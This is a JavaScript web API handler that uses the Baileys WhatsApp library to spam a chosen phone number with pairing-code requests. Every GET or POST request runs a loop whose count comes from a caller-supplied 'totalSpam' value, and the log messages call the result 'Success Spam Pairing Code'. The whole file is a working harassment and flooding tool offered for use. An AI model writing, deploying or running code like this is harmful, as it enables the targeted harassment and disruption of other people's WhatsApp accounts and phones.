import { default as makeWASocket, useMultiFileAuthState } from "@whiskeysockets/baileys";
import pino from 'pino';

const color = [
    '\x1b[31m', 
    '\x1b[32m', 
    '\x1b[33m', 
    '\x1b[34m', 
    '\x1b[35m', 
    '\x1b[36m'
];
const xColor = '\x1b[0m';

export default async function handler(req, res) {
    if (req.method === 'POST') {
        const { phoneNumber, totalSpam } = req.body;

        if (!phoneNumber || !totalSpam || isNaN(totalSpam) || totalSpam <= 0) {
            return res.status(400).json({ message: 'Invalid input. Please provide a valid phone number and total spam count.' });
        }

        try {
            const KleeCodes = parseInt(totalSpam);
            const { state } = await useMultiFileAuthState('./69/session');
            const KleeBotInc = makeWASocket({
                logger: pino({ level: "silent" }),
                auth: state,
            });

            for (let i = 0; i < KleeCodes; i++) {
                try {
                    let code = await KleeBotInc.requestPairingCode(phoneNumber);
                    code = code?.match(/.{1,4}/g)?.join("-") || code;
                    console.log(color + `Success Spam Pairing Code - Number : ${phoneNumber} from : [${i + 1}/${KleeCodes}]` + xColor);
                } catch (error) {
                    console.error('Error:', error.message);
                }
            }
            res.status(200).json({ message: 'Spam pairing process started.' });
        } catch (error) {
            res.status(500).json({ message: 'An error occurred while processing your request.', error: error.message });
        }
    } else if (req.method === 'GET') {
        const { phoneNumber, totalSpam } = req.query;

        if (!phoneNumber || !totalSpam || isNaN(totalSpam) || totalSpam <= 0) {
            return res.status(400).json({ message: 'Invalid input. Please provide a valid phone number and total spam count as query parameters.' });
        }

        try {
            const KleeCodes = parseInt(totalSpam);
            const { state } = await useMultiFileAuthState('./69/session');
            const KleeBotInc = makeWASocket({
                logger: pino({ level: "silent" }),
                auth: state,
            });

            for (let i = 0; i < KleeCodes; i++) {
                try {
                    let code = await KleeBotInc.requestPairingCode(phoneNumber);
                    code = code?.match(/.{1,4}/g)?.join("-") || code;
                    console.log(color + `Success Spam Pairing Code - Number : ${phoneNumber} from : [${i + 1}/${KleeCodes}]` + xColor);
                } catch (error) {
                    console.error('Error:', error.message);
                }
            }
            res.status(200).json({ message: 'Spam pairing process started.' });
        } catch (error) {
            res.status(500).json({ message: 'An error occurred while processing your request.', error: error.message });
        }
    } else {
        res.setHeader('Allow', ['GET', 'POST']);
        res.status(405).end(`Method ${req.method} Not Allowed`);
    }
}